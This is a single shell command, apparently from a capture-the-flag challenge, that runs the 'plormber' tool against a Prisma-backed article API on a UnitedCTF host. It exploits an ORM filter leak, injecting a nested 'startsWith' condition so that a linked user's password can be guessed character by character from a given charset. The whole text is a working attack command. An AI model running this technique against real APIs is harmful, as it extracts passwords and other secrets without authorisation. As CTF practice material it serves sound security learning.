plormber prisma-contains \
    --chars '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-' \
    --base-query-json '{"query": {PAYLOAD}}' \
    --leak-query-json '{"where": {"clowns": {"some": {"clown": {"password": {"startsWith": "{ORM_LEAK}"}}}}}}' \
    --verbose-stats \
    https://onlyparks3.c.unitedctf.ca/api/article;